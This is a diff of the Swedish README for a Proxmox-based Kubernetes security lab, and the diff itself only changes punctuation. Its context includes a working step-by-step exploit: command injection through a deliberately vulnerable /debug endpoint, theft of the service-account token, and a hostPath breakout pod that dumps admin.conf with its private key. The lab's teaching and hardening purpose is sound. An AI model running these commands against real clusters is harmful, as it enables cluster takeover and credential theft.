@@ -1,4 +1,4 @@
-# AutoLab — Automatiserat Kubernetes-labb på Proxmox
+# AutoLab: Automatiserat Kubernetes-labb på Proxmox
 
 > En fullautomatiserad labbmiljö som provisionerar ett Kubernetes-kluster med HashiCorp Vault på Proxmox via Packer, Terraform och Ansible. Miljön inkluderar en avsiktligt sårbar webbapplikation och ett automatiserat CIS-benchmark-verktyg (kube-bench) för säkerhetsanalys.
 
@@ -64,7 +64,7 @@ autolab/
 │       └── virtual-machine/       # Återanvändbar modul för Proxmox VM (klon av Packer-template)
 │
 ├── ansible/
-│   ├── site.yml                   # Master playbook — kör alla roller i rätt ordning
+│   ├── site.yml                   # Master playbook: kör alla roller i rätt ordning
 │   ├── security.yml               # Playbook för CIS-benchmark (kube-bench)
 │   ├── verify.yml                 # Playbook för klusterkontroll
 │   ├── requirements.yml           # Ansible Galaxy-collections
@@ -92,26 +92,26 @@ autolab/
 
 ## Komponenter
 
-### Packer — VM-template
+### Packer: VM-template
 
 Bygger en Ubuntu 24.04 LTS-template i Proxmox med Q35-maskintyp och UEFI (OVMF). Autoinstall körs via en cloud-init CIDATA-ISO. Template:en rensas (SSH host keys, machine-id) och cloud-init konfigureras för Proxmox-kompatibelt NoCloud-läge. Terraform klonar sedan denna template för varje Kubernetes-nod.
 
-### Terraform — provisionering
+### Terraform: provisionering
 
 Provisionerar hela infrastrukturen mot Proxmox via `bpg/proxmox`-providern. Skapar:
 
-1. **Ansible control node** (LXC) — med nesting aktiverat för att köra Ansible
-2. **Vault** (LXC) — enkel container för HashiCorp Vault
+1. **Ansible control node** (LXC) med nesting aktiverat för att köra Ansible
+2. **Vault** (LXC), enkel container för HashiCorp Vault
 3. **Kubernetes control plane** (VM klonad från Packer-template)
 4. **Kubernetes workers** (VMs klonade från Packer-template, antal styrs av `workers`-variabeln)
 
 Terraform genererar två ED25519-nyckelpar:
-- `terraform_ssh` — för Terraform-provisioners mot LXC-containers
-- `ansible_ssh` — injiceras i alla noder; privnyckeln kopieras till Ansible control node
+- `terraform_ssh` för Terraform-provisioners mot LXC-containers
+- `ansible_ssh` injiceras i alla noder; privnyckeln kopieras till Ansible control node
 
 Bootstrap-provisioners körs via `terraform_data`-resurser med `local-exec` och sköter installation av Ansible, Git och kloning av repot till `/opt/autolab` på control node. Ansible-inventory genereras dynamiskt med de DHCP-tilldelade IP-adresserna och skrivs till control node.
 
-### Ansible — konfigurationshantering
+### Ansible: konfigurationshantering
 
 Master-playbooken `site.yml` kör följande plays i ordning:
 
@@ -256,7 +256,7 @@ cp secrets.yml_example secrets.yml
 
 Terraform kopierar automatiskt `secrets.yml` till Ansible control node under `terraform apply` och raderar den sedan från noden när Vault har konfigurerats. Secrets lagras därefter i HashiCorp Vault och hämtas därifrån av Ansible vid behov.
 
-Proxmox API-credentials hanteras via `.env` och exporteras som miljövariabler — de skickas aldrig in i Terraform-state.
+Proxmox API-credentials hanteras via `.env` och exporteras som miljövariabler. De skickas aldrig in i Terraform-state.
 
 ```yaml
 # secrets.yml_example
@@ -294,21 +294,21 @@ Rollen `k8s-vulnerable` innehåller medvetet följande säkerhetsbrister som und
 
 **Brist 1: ClusterAdmin service account**
 
-Webbappens pod kör med ett service account som har `cluster-admin`-roll — fulla rättigheter i klustret. En angripare som komprometterar podden kan kontrollera hela klustret via Kubernetes API.
+Webbappens pod kör med ett service account som har `cluster-admin`-roll (fulla rättigheter i klustret). En angripare som komprometterar podden kan kontrollera hela klustret via Kubernetes API.
 
 *Åtgärd:* Skapa ett dedikerat service account med minsta nödvändiga RBAC-rättigheter (principen om minsta privilegium).
 
 *Syfte i denna miljö:* Illustrera risken med överprivilegerade service accounts och hur kube-bench flaggar avsaknad av RBAC-härdning.
 
-**Exploit — container escape via service account-token:**
+**Exploit: container escape via service account-token**
 
-Förutsättning: angriparen har hittat webbappens exponerade `/debug?cmd=`-endpoint. Endpointen använder `os.popen()` vilket ger ett **fullt shell** — pipes, `$(...)`-substitution och redirects fungerar.
+Förutsättning: angriparen har hittat webbappens exponerade `/debug?cmd=`-endpoint. Endpointen använder `os.popen()` vilket ger ett **fullt shell**: pipes, `$(...)`-substitution och redirects fungerar.
 
 > **`/debug`-endpointen är initial access, inte ett krav för Brist 1.** Vilket RCE-hål eller path traversal som helst som kan läsa `/var/run/secrets/kubernetes.io/serviceaccount/token` ger samma resultat. Endpointen är i sig en egen brist; token-stölden fungerar identiskt via t.ex. SSTI, deserialisering eller en sårbar dependency.
 
-Kubernetes API-servern behöver **inte** vara externt nåbar — alla API-anrop sker inifrån webapp-containern mot Kubernetes API-servern vars adress Kubernetes automatiskt injicerar som miljövariablerna `KUBERNETES_SERVICE_HOST` och `KUBERNETES_SERVICE_PORT` i varje pod. Observera att DNS (`kubernetes.default.svc`) inte nödvändigtvis fungerar inuti containern beroende på CoreDNS-status — env-variabelmetoden är mer robust. Angripardatorn skickar enbart HTTP-anrop mot webapp-porten.
+Kubernetes API-servern behöver **inte** vara externt nåbar. Alla API-anrop sker inifrån webapp-containern mot Kubernetes API-servern vars adress Kubernetes automatiskt injicerar som miljövariablerna `KUBERNETES_SERVICE_HOST` och `KUBERNETES_SERVICE_PORT` i varje pod. Observera att DNS (`kubernetes.default.svc`) inte nödvändigtvis fungerar inuti containern beroende på CoreDNS-status, så env-variabelmetoden är mer robust. Angripardatorn skickar enbart HTTP-anrop mot webapp-porten.
 
-Den övergripande gången är fyra steg: stjäla service-account-token, verifiera att den har cluster-admin, skapa en pod på mastern som monterar värdens rotfilsystem och låter sin container-process skriva ut `admin.conf` på stdout, och slutligen läsa pod-loggen via K8s API. Inget kubectl och ingen container-härdningsöverträdelse behövs — bara RBAC-tillåtelsen att skapa pods med `hostPath`-volymer (vilket cluster-admin innebär).
+Den övergripande gången är fyra steg: stjäla service-account-token, verifiera att den har cluster-admin, skapa en pod på mastern som monterar värdens rotfilsystem och låter sin container-process skriva ut `admin.conf` på stdout, och slutligen läsa pod-loggen via K8s API. Inget kubectl och ingen container-härdningsöverträdelse behövs, bara RBAC-tillåtelsen att skapa pods med `hostPath`-volymer (vilket cluster-admin innebär).
 
 ```bash
 WEBAPP="http://<WEBAPP-IP>:30500"
@@ -319,7 +319,7 @@ TOKEN=$(curl -s --get --data-urlencode \
   "$WEBAPP/debug")
 
 # Steg 2: Verifiera cluster-admin via intern K8s API (Python inbyggt i Flask-containern)
-# KUBERNETES_SERVICE_HOST/PORT-env-variablerna används — DNS kan vara otillgängligt i containern
+# KUBERNETES_SERVICE_HOST/PORT-env-variablerna används; DNS kan vara otillgängligt i containern
 curl -s --get --data-urlencode 'cmd=python3 -c "\
 import urllib.request, ssl, json, os; \
 t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
@@ -332,10 +332,10 @@ req = urllib.request.Request( \
 r = json.loads(urllib.request.urlopen(req, context=ctx).read()); \
 print([x[\"metadata\"][\"name\"] for x in r[\"items\"]])\
 " 2>&1' "$WEBAPP/debug"
-# → listar alla pods utan 403 — bekräftar cluster-admin
+# → listar alla pods utan 403 (bekräftar cluster-admin)
 
 # Steg 3: Skapa breakout-pod på control plane med host-filsystemet monterat
-# Containern cat:ar admin.conf till stdout och avslutar — hela filen hamnar i pod-loggen
+# Containern cat:ar admin.conf till stdout och avslutar; hela filen hamnar i pod-loggen
 # nodeSelector tvingar podden till mastern (admin.conf finns bara där)
 # restartPolicy=Never så kubelet inte loopar containern och roterar bort loggen
 curl -s --get --data-urlencode 'cmd=python3 -c "\
@@ -371,7 +371,7 @@ req = urllib.request.Request( \
 print(urllib.request.urlopen(req, context=ctx).read().decode()[:200])\
 " 2>&1' "$WEBAPP/debug"
 
-# (Vänta tills podden gått från Pending → Succeeded — typiskt 10–20 s första gången
+# (Vänta tills podden gått från Pending → Succeeded, typiskt 10–20 s första gången
 # medan ubuntu-imagen pullas. Polla status om du vill:)
 curl -s --get --data-urlencode 'cmd=python3 -c "\
 import urllib.request, ssl, json, os; \
@@ -386,7 +386,7 @@ r = json.loads(urllib.request.urlopen(req, context=ctx).read()); \
 print(r[\"status\"][\"phase\"])\
 " 2>&1' "$WEBAPP/debug"
 
-# Steg 4: Läs admin.conf via pod-loggen — vanlig GET mot K8s API, inget kubectl behövs
+# Steg 4: Läs admin.conf via pod-loggen, vanlig GET mot K8s API, inget kubectl behövs
 curl -s --get --data-urlencode 'cmd=python3 -c "\
 import urllib.request, ssl, os; \
 t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
@@ -401,9 +401,9 @@ print(urllib.request.urlopen(req, context=ctx).read().decode())\
 # → admin.conf med fullständiga cluster-admin-credentials inklusive privat RSA-nyckel
 ```
 
-Notera vad som **inte** behövs i breakout-podden: ingen `privileged: true`, ingen `hostPID`, inga extra Linux capabilities. Att montera värdens rotfilsystem via `hostPath` är i sig den privilegierade operationen från klustrets sida — men det visas inte i pod-specens `securityContext`. Container:n kör som UID 0 (default för `ubuntu`-imagen), vilket utan user namespaces mappar mot host UID 0, och kan därför läsa `/host/etc/kubernetes/admin.conf` (mode 0600, ägd av root). Det är RBAC:s tillåtelse att skapa pods med `hostPath`-volymer som är hela problemet — inte container-säkerhet.
+Notera vad som **inte** behövs i breakout-podden: ingen `privileged: true`, ingen `hostPID`, inga extra Linux capabilities. Att montera värdens rotfilsystem via `hostPath` är i sig den privilegierade operationen från klustrets sida, men det visas inte i pod-specens `securityContext`. Container:n kör som UID 0 (default för `ubuntu`-imagen), vilket utan user namespaces mappar mot host UID 0, och kan därför läsa `/host/etc/kubernetes/admin.conf` (mode 0600, ägd av root). Det är RBAC:s tillåtelse att skapa pods med `hostPath`-volymer som är hela problemet, inte container-säkerhet.
 
-Att läsa filen via **pod-loggen** i stället för `kubectl exec` är medvetet: pod-loggen är en vanlig HTTP GET mot K8s API (kräver bara `pods/log`, som täcks av cluster-admin), ingen WebSocket/SPDY-uppgradering, ingen 50 MB-binär att ladda ner in i webapp-pod:n, och ingen risk att lastbalansering skickar nedladdningen till en pod-instans och exec-anropet till en annan. Container:s `command` skriver hela `admin.conf` till stdout och avslutar — kubelet sparar stdout i pod-loggen där den ligger kvar tills podden raderas.
+Att läsa filen via **pod-loggen** i stället för `kubectl exec` är medvetet: pod-loggen är en vanlig HTTP GET mot K8s API (kräver bara `pods/log`, som täcks av cluster-admin), ingen WebSocket/SPDY-uppgradering, ingen 50 MB-binär att ladda ner in i webapp-pod:n, och ingen risk att lastbalansering skickar nedladdningen till en pod-instans och exec-anropet till en annan. Container:s `command` skriver hela `admin.conf` till stdout och avslutar; kubelet sparar stdout i pod-loggen där den ligger kvar tills podden raderas.
 
 Resultatet är fullständig kontroll över klustret utan SSH-åtkomst, utan lösenord och utan att API-servern behöver vara externt exponerad. Angripardatorn kommunicerar enbart med den publikt exponerade webapp-porten (30500) under hela attacken.
 
@@ -503,7 +503,7 @@ Terraform är bra på att provisionera infrastruktur men saknar idempotent konfi
 
 ### Varför LXC för Ansible control och Vault?
 
-Ansible control node och Vault behöver inte kernel-isolation — de kör inga containers och inga privilegierade processer som kräver egna namespaces. LXC-containers startar snabbare, förbrukar mindre RAM och är enklare att provisionera via Proxmox API. Kubernetes-noderna kräver VMs eftersom kubeadm och containerd behöver tillgång till kernel-features som är begränsade i LXC.
+Ansible control node och Vault behöver inte kernel-isolation. De kör inga containers och inga privilegierade processer som kräver egna namespaces. LXC-containers startar snabbare, förbrukar mindre RAM och är enklare att provisionera via Proxmox API. Kubernetes-noderna kräver VMs eftersom kubeadm och containerd behöver tillgång till kernel-features som är begränsade i LXC.
 
 ### Varför dynamiskt genererade SSH-nyckelpar i Terraform?
 
@@ -511,27 +511,27 @@ Statiska nycklar i repot eller hardkodade i konfiguration är en säkerhetsrisk.
 
 ### Varför HashiCorp Vault för DockerHub-credentials?
 
-Alternativet — att lägga credentials direkt i `secrets.yml` och låta Ansible skicka dem direkt till Kubernetes Secrets — hade fungerat men lämnar credentials synliga som env-variabler i Ansible-output och möjligen i logs. Vault ger ett separat lager: credentials lagras och roteras centralt, och AppRole-autentisering begränsar vilka som kan hämta dem.
+Alternativet (att lägga credentials direkt i `secrets.yml` och låta Ansible skicka dem direkt till Kubernetes Secrets) hade fungerat men lämnar credentials synliga som env-variabler i Ansible-output och möjligen i logs. Vault ger ett separat lager: credentials lagras och roteras centralt, och AppRole-autentisering begränsar vilka som kan hämta dem.
 
 ### Varför en avsiktligt sårbar webbapp?
 
-`k8s-vulnerable`-rollen existerar för att ha konkreta brister att analysera med kube-bench och för att demonstrera skillnaden mellan en säker och osäker Kubernetes-driftsättning. Bristerna är dokumenterade och avsiktliga — de ger underlag för säkerhetsanalysen i rapporten.
+`k8s-vulnerable`-rollen existerar för att ha konkreta brister att analysera med kube-bench och för att demonstrera skillnaden mellan en säker och osäker Kubernetes-driftsättning. Bristerna är dokumenterade och avsiktliga och ger underlag för säkerhetsanalysen i rapporten.
 
 ### Varför går all Proxmox-kommunikation via API och inte SSH?
 
-Terraform-provisioners och Packer kommunicerar uteslutande med Proxmox via dess REST API. Operatörsdatorn behöver aldrig SSH-åtkomst till själva hypervisorn. Det ger två fördelar: Proxmox-noden behöver inte ha en SSH-nyckel från operatörsdatorn (minskad attackyta), och behörigheter kan begränsas på API-tokennivå i Proxmox RBAC istället för att ge bred SSH-åtkomst. Nackdelen är att API-token och endpoint måste hanteras som secrets — vilket `.env`-filen löser.
+Terraform-provisioners och Packer kommunicerar uteslutande med Proxmox via dess REST API. Operatörsdatorn behöver aldrig SSH-åtkomst till själva hypervisorn. Det ger två fördelar: Proxmox-noden behöver inte ha en SSH-nyckel från operatörsdatorn (minskad attackyta), och behörigheter kan begränsas på API-tokennivå i Proxmox RBAC istället för att ge bred SSH-åtkomst. Nackdelen är att API-token och endpoint måste hanteras som secrets, vilket `.env`-filen löser.
 
 ### Varför DockerHub som container registry?
 
-Ett lokalt registry (t.ex. Harbor eller ett Proxmox-hostat registry) hade undvikit beroendet av ett externt konto och internet-åtkomst vid image-push. DockerHub valdes ändå av tre skäl: det kräver noll infrastruktur utöver ett gratis konto, det är den naturliga integrationen för `community.docker`-modulen i Ansible, och det möjliggör att demonstrera hur Vault hanterar externa tjänsters credentials — vilket är ett mer realistiskt scenario än ett internt registry utan autentisering.
+Ett lokalt registry (t.ex. Harbor eller ett Proxmox-hostat registry) hade undvikit beroendet av ett externt konto och internet-åtkomst vid image-push. DockerHub valdes ändå av tre skäl: det kräver noll infrastruktur utöver ett gratis konto, det är den naturliga integrationen för `community.docker`-modulen i Ansible, och det möjliggör att demonstrera hur Vault hanterar externa tjänsters credentials, vilket är ett mer realistiskt scenario än ett internt registry utan autentisering.
 
 Nackdelen är att image-bygget kräver internet-åtkomst från control plane och att DockerHub-credentials måste hanteras som en secret. Det senare är dock i sig en pedagogiskt poäng: det visar varför Vault behövs.
 
 ### Varför utökas disken via Ansible och inte Packer eller cloud-init?
 
-Packer bygger template-VM:en med en liten disk (10 GB) för snabb build. Terraform klonar sedan template:en och sätter den faktiska diskstorleken (40 GB) — men Proxmox expanderar bara blockenheten, inte partitionerna eller LV:t inuti. Cloud-init:s `growpart`-modul löser detta normalt i riktiga cloud-images, men kräver att cloud-init körs med rätt datasource och konfiguration efter varje klon, vilket är svårt att garantera.
+Packer bygger template-VM:en med en liten disk (10 GB) för snabb build. Terraform klonar sedan template:en och sätter den faktiska diskstorleken (40 GB), men Proxmox expanderar bara blockenheten, inte partitionerna eller LV:t inuti. Cloud-init:s `growpart`-modul löser detta normalt i riktiga cloud-images, men kräver att cloud-init körs med rätt datasource och konfiguration efter varje klon, vilket är svårt att garantera.
 
-`common`-rollen utökar i stället disken explicit med `growpart`, `pvresize` och `lvextend -r` på alla noder där `ubuntu-vg` finns. Stegen är idempotenta — ingenting händer om LV:t redan är maximalt. LXC-containers (som saknar LVM) hoppas automatiskt över via villkoret på `vg_free`.
+`common`-rollen utökar i stället disken explicit med `growpart`, `pvresize` och `lvextend -r` på alla noder där `ubuntu-vg` finns. Stegen är idempotenta: ingenting händer om LV:t redan är maximalt. LXC-containers (som saknar LVM) hoppas automatiskt över via villkoret på `vg_free`.
 
 ### Varför Calico som CNI?
 
